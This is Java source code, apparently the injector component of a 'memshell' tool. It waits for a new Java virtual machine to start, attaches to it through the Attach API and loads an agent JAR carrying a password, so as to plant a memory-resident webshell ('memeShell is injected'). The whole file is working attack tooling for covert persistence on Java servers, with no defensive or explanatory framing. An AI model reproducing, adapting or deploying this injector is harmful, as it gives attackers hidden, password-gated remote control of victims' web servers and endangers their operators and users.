package net.rebeyond.memshell;
import java.io.File;
import java.util.List;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class Attach {

	public static void main(String[] args) throws Exception {

		if (args.length!=1)
		{
			System.out.println("Usage:java -jar inject.jar password");
			return;
		}
		VirtualMachine vm = null;
		List<VirtualMachineDescriptor> listAfter = null;
		List<VirtualMachineDescriptor> listBefore = null;
		listBefore = VirtualMachine.list();
		String password=args[0];
		String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
		currentPath=currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
		String agentFile = currentPath + "agent.jar";
		agentFile = new File(agentFile).getCanonicalPath();
		String agentArgs=currentPath;
		if (!password.equals("")||password!=null)
		{
			agentArgs=agentArgs+"^"+password;
		}
		
		while (true) {
			try {
				listAfter = VirtualMachine.list();
				if (listAfter.size() <= 0)
					continue;
				for (VirtualMachineDescriptor vmd : listAfter) {
					if (!listBefore.contains(vmd)) {
						vm = VirtualMachine.attach(vmd);
						listBefore.add(vmd);
						System.out.println("[+]OK.i find a jvm.");
						Thread.sleep(1000);
						if (null != vm) {							
							vm.loadAgent(agentFile, agentArgs);
							System.out.println("[+]memeShell is injected.");
							vm.detach();
							return;
						}
					}
				}
				Thread.sleep(5000);
				
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}
}